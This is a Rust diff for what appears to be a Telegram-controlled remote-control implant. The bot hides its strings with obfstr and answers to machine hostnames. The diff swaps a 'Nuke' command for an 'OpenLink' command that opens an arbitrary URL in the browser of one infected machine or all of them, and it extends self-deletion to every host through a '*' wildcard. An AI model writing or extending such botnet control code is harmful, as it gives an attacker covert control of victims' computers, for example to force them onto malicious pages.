@@ -13,8 +13,8 @@ use obfstr::obfstr as s;
 enum Command {
     #[command(description = "remove the executable from the system with the given hostname")]
     Remove(String),
-    #[command(description = "nuke all the executables running")]
-    Nuke,
+    #[command(description = "open a link on the machine with the specified hostname", parse_with = "split")]
+    OpenLink{hostname: String, link: String},
     #[command(description = "show this text")]
     Help
 }
@@ -26,16 +26,23 @@ async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
 
     match cmd {
         Command::Remove(hostname) => {
-            if hostname == gethostname().to_string_lossy() {
+            if hostname == "*" || hostname == gethostname().to_string_lossy() {
                 bot.send_message(msg.chat.id, "Removing executable from system").await?;
                 std::fs::remove_file(std::env::current_exe().unwrap()).unwrap();
                 std::process::exit(0);
             }
-        }
-        Command::Nuke => {
-            bot.send_message(msg.chat.id, format!("Nuking {}", gethostname().to_string_lossy())).await?;
-            std::fs::remove_file(std::env::current_exe().unwrap()).unwrap();
-            std::process::exit(0);
+        },
+        Command::OpenLink {hostname, link} => {
+            if hostname == "*" || hostname == gethostname().to_string_lossy() {
+                match webbrowser::open(&link) {
+                    Ok(_) => {
+                        bot.send_message(msg.chat.id, format!("Opened link {} on {}", link, gethostname().to_string_lossy())).await?;
+                    }
+                    Err(_) => {
+                        bot.send_message(msg.chat.id, format!("Failed to open link {} on {}", link, gethostname().to_string_lossy())).await?;
+                    }
+                }
+            }
         },
         Command::Help => {
             bot.send_message(msg.chat.id, Command::descriptions().to_string()).await?;
